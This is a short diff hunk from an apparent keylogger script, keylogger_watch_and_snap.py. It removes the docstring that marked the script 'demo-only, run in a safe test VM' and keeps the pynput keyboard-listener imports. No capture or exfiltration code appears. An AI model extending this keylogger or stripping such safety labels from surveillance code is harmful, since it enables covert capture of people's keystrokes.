@@ -1,6 +1,4 @@
-"""
-keylogger_watch_and_snap.py   –   demo‑only, run in a safe test VM
-"""
+
 from pynput.keyboard import Key, Listener
 from datetime import datetime
 from pathlib import Path
